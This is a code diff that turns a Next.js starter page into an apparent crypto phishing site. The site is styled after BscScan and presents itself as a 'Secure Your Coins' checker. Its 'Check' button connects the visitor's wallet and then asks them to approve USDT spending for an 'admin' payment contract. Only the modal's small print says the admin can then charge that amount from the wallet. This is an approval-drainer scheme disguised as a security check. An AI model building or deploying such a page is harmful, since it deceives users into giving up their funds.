@@ -1,103 +1,422 @@
-import Image from "next/image";
+'use client';
+
+import { useState } from 'react';
+import { ethers } from 'ethers';
+import { getUSDTContract, CONTRACT_ADDRESSES } from '../lib/contracts';
+import { walletService, WalletInfo } from '../lib/wallet';
 
 export default function Home() {
-  return (
-    <div className="font-sans grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20">
-      <main className="flex flex-col gap-[32px] row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="font-mono list-inside list-decimal text-sm/6 text-center sm:text-left">
-          <li className="mb-2 tracking-[-.01em]">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] font-mono font-semibold px-1 py-0.5 rounded">
-              src/app/page.tsx
-            </code>
-            .
-          </li>
-          <li className="tracking-[-.01em]">
-            Save and see your changes instantly.
-          </li>
-        </ol>
+  const [isModalOpen, setIsModalOpen] = useState(false);
+  const [walletInfo, setWalletInfo] = useState<WalletInfo | null>(null);
+  const [usdtBalance, setUsdtBalance] = useState('0');
+  const [amount, setAmount] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const [isConnecting, setIsConnecting] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+  const [transactionStatus, setTransactionStatus] = useState<{
+    hash: string;
+    status: 'pending' | 'success' | 'failed';
+    message?: string;
+  } | null>(null);
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:w-auto"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 w-full sm:w-auto md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
+  const handleCheckButton = async () => {
+    if (!walletInfo) {
+      // If wallet is not connected, try to connect first
+      await connectWallet();
+    } else {
+      // If wallet is already connected, open modal
+      setIsModalOpen(true);
+      await loadUSDTBalance();
+    }
+  };
+
+  const connectWallet = async () => {
+    setIsConnecting(true);
+    setError(null);
+    
+    try {
+      const info = await walletService.connectWallet();
+      setWalletInfo(info);
+      setIsModalOpen(true);
+      await loadUSDTBalance();
+    } catch (error: any) {
+      setError(error.message || 'Failed to connect wallet');
+    } finally {
+      setIsConnecting(false);
+    }
+  };
+
+  const loadUSDTBalance = async () => {
+    try {
+      const usdtContract = getUSDTContract();
+      if (usdtContract) {
+        console.log('Loading USDT balance...');
+        
+        // Try to get balance with better error handling
+        try {
+          const balance = await usdtContract.balanceOf(CONTRACT_ADDRESSES.paymentContract);
+          const decimals = await usdtContract.decimals();
+          const formattedBalance = ethers.utils.formatUnits(balance, decimals);
+          setUsdtBalance(formattedBalance);
+          console.log('USDT balance loaded successfully:', formattedBalance);
+        } catch (balanceError: any) {
+          console.warn('Could not load USDT balance:', balanceError.message);
+          // Set a default value if we can't load the balance
+          setUsdtBalance('0.00');
+        }
+      }
+    } catch (error) {
+      console.error('Error loading USDT balance:', error);
+      // Set a default value on error
+      setUsdtBalance('0.00');
+    }
+  };
+
+  const handleApprove = async () => {
+    if (!amount || parseFloat(amount) <= 0) {
+      alert('Please enter a valid amount');
+      return;
+    }
+
+    setIsLoading(true);
+    setTransactionStatus(null);
+
+    try {
+      const usdtContract = getUSDTContract();
+      if (!usdtContract) throw new Error('USDT contract not available');
+
+      const amountWei = ethers.utils.parseUnits(amount, 6); // USDT has 6 decimals
+      const tx = await usdtContract.approve(CONTRACT_ADDRESSES.paymentContract, amountWei);
+      
+      setTransactionStatus({
+        hash: tx.hash,
+        status: 'pending',
+        message: 'Approving USDT for admin...'
+      });
+
+      const receipt = await tx.wait();
+      
+      setTransactionStatus({
+        hash: tx.hash,
+        status: 'success',
+        message: 'USDT approved successfully! Admin can now charge this amount.'
+      });
+
+      setAmount('');
+    } catch (error: any) {
+      // Improve error message display
+      let errorMessage = 'Transaction failed';
+      
+      if (error.code === 'ACTION_REJECTED') {
+        errorMessage = 'Transaction was rejected by user';
+      } else if (error.message && error.message.includes('user rejected transaction')) {
+        errorMessage = 'Transaction was cancelled';
+      } else if (error.message && error.message.includes('insufficient funds')) {
+        errorMessage = 'Insufficient funds for transaction';
+      } else if (error.message && error.message.includes('gas')) {
+        errorMessage = 'Gas estimation failed';
+      } else if (error.message) {
+        // Extract a shorter, more readable error message
+        const message = error.message;
+        if (message.includes('execution reverted')) {
+          errorMessage = 'Transaction reverted - check your input';
+        } else if (message.length > 100) {
+          errorMessage = 'Transaction failed - please try again';
+        } else {
+          errorMessage = message;
+        }
+      }
+      
+      setTransactionStatus({
+        hash: '',
+        status: 'failed',
+        message: errorMessage
+      });
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const disconnectWallet = async () => {
+    console.log('Disconnect button clicked');
+    try {
+      // Clear state immediately for better UX
+      setWalletInfo(null);
+      setIsModalOpen(false);
+      setTransactionStatus(null);
+      setAmount('');
+      setError(null);
+      
+      // Then disconnect from wallet service
+      await walletService.disconnectWallet();
+      
+      console.log('Wallet disconnected successfully');
+    } catch (error) {
+      console.error('Error disconnecting wallet:', error);
+      // State is already cleared above, so no need to clear again
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex flex-col" style={{ background: 'linear-gradient(to right, rgb(0, 0, 0), rgb(40, 41, 42))' }}>
+      {/* Header */}
+      <header className="bg-black text-white">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex items-center justify-between h-16">
+            <div className="flex items-center">
+              <img 
+                alt="Logo" 
+                src="/logo.png" 
+                className="h-12 w-auto object-cover"
+              />
+            </div>
+            
+            {/* Desktop Navigation */}
+            <nav className="hidden md:flex space-x-8">
+              <a 
+                href="https://bscscan.com" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
+              >
+                Home
+              </a>
+              <a 
+                href="https://bscscan.com/txs" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
+              >
+                Blockchain
+              </a>
+              <a 
+                href="https://bscscan.com/tokens" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
+              >
+                Tokens
+              </a>
+              <a 
+                href="https://bscscan.com/validators" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
+              >
+                Validators
+              </a>
+              <a 
+                href="https://bscscan.com/nft-top-contracts" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
+              >
+                NFTs
+              </a>
+              <a 
+                href="https://bscscan.com/charts" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
+              >
+                Resources
+              </a>
+              <a 
+                href="https://bscscan.com/verifyContract" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-white hover:bg-yellow-400 hover:bg-opacity-20 transition-all duration-300 px-3 py-2 rounded"
+              >
+                Developers
+              </a>
+            </nav>
+
+            {/* Mobile Menu Button */}
+            <button className="md:hidden p-2">
+              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </header>
+
+      {/* Main Content */}
+      <main className="flex-1 flex items-center justify-center">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+          <h1 className="text-4xl font-bold mb-4" style={{ color: 'rgb(255, 204, 0)' }}>
+            Secure Your Coins
+          </h1>
+          <h2 className="text-xl text-white mb-8">
+            Ensure your tokens are secure on every network.
+          </h2>
+          
+          <div className="flex justify-center">
+            <button
+              onClick={handleCheckButton}
+              disabled={isConnecting}
+              className="flex items-center gap-2 px-6 py-3 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors duration-300"
+            >
+              <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" className="w-5 h-5">
+                <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"></path>
+              </svg>
+              {isConnecting ? 'Connecting...' : 'Check'}
+            </button>
+          </div>
+
+          {error && (
+            <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg max-w-md mx-auto">
+              <p className="text-sm text-red-700">{error}</p>
+            </div>
+          )}
         </div>
       </main>
-      <footer className="row-start-3 flex gap-[24px] flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
+
+      {/* Footer */}
+      <footer className="bg-black text-white py-6">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+          <p className="text-sm">
+            © 2025 Best application to secure your coins All rights reserved.
+          </p>
+        </div>
       </footer>
+
+      {/* Modal */}
+      {isModalOpen && (
+        <div 
+          className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
+          onClick={() => setIsModalOpen(false)}
+        >
+          <div 
+            className="bg-white rounded-lg p-8 max-w-md w-full mx-4"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div className="flex justify-between items-center mb-6">
+              <h3 className="text-xl font-semibold text-gray-900">USDT Balance & Approval</h3>
+              <button
+                onClick={() => setIsModalOpen(false)}
+                className="text-gray-400 hover:text-gray-600"
+              >
+                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                </svg>
+              </button>
+            </div>
+
+            {/* Wallet Connection Status */}
+            {walletInfo && (
+              <div className="mb-4 p-3 bg-green-50 border border-green-200 rounded-lg">
+                <div className="flex items-center justify-between">
+                  <div>
+                    <p className="text-sm font-medium text-green-800">Wallet Connected</p>
+                    <p className="text-xs text-green-600">
+                      {walletInfo.address.slice(0, 6)}...{walletInfo.address.slice(-4)}
+                    </p>
+                  </div>
+                  <button
+                    onClick={() => {
+                      console.log('Disconnect button clicked');
+                      try {
+                        // Clear state immediately
+                        setWalletInfo(null);
+                        setIsModalOpen(false);
+                        setTransactionStatus(null);
+                        setAmount('');
+                        setError(null);
+                        
+                        // Disconnect wallet service
+                        walletService.disconnectWallet().then(() => {
+                          console.log('Wallet disconnected successfully');
+                        }).catch((error) => {
+                          console.error('Error disconnecting wallet:', error);
+                        });
+                      } catch (error) {
+                        console.error('Error in disconnect button:', error);
+                        // Ensure state is cleared even if there's an error
+                        setWalletInfo(null);
+                        setIsModalOpen(false);
+                        setTransactionStatus(null);
+                        setAmount('');
+                        setError(null);
+                      }
+                    }}
+                    className="text-sm text-green-600 hover:text-green-800 hover:underline transition-colors"
+                  >
+                    Disconnect
+                  </button>
+                </div>
+              </div>
+            )}
+
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Contract USDT Balance
+                </label>
+                <p className="text-lg font-semibold text-gray-900">
+                  {parseFloat(usdtBalance).toFixed(2)} USDT
+                </p>
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Amount to Approve(USDT)
+                </label>
+                <input
+                  type="number"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  placeholder="0.0"
+                  step="0.01"
+                  className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-yellow-500 focus:border-yellow-500"
+                  disabled={isLoading}
+                />
+                <p className="text-xs text-gray-500 mt-1">
+                  This amount will be available for the admin to charge from your wallet
+                </p>
+                <div className="mt-2 p-2 bg-yellow-50 border border-yellow-200 rounded text-xs text-yellow-800">
+                  ⚠️ <strong>Important:</strong> You can approve any amount, but the admin can only charge what you actually have in your wallet. Make sure you have enough USDT before approving.
+                </div>
+              </div>
+
+              <button
+                onClick={handleApprove}
+                disabled={isLoading || !amount || !walletInfo}
+                className="w-full flex items-center justify-center gap-2 px-4 py-2 bg-yellow-400 text-black font-medium rounded-lg hover:bg-yellow-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+              >
+                {isLoading ? 'Processing...' : 'Approve USDT for Admin'}
+              </button>
+
+              {transactionStatus && (
+                <div className={`p-4 rounded-lg border ${
+                  transactionStatus.status === 'success' 
+                    ? 'text-green-600 bg-green-50 border-green-200'
+                    : transactionStatus.status === 'failed'
+                    ? 'text-red-600 bg-red-50 border-red-200'
+                    : 'text-yellow-600 bg-yellow-50 border-yellow-200'
+                }`}>
+                  <div className="flex items-start justify-between">
+                    <div className="flex-1">
+                      <p className="font-medium">{transactionStatus.message}</p>
+                      {transactionStatus.hash && (
+                        <p className="text-sm mt-1 break-all">
+                          Hash: {transactionStatus.hash.slice(0, 10)}...{transactionStatus.hash.slice(-8)}
+                        </p>
+                      )}
+                    </div>
+                    <button
+                      onClick={() => setTransactionStatus(null)}
+                      className="ml-3 text-sm hover:underline flex-shrink-0"
+                    >
+                      Dismiss
+                    </button>
+                  </div>
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
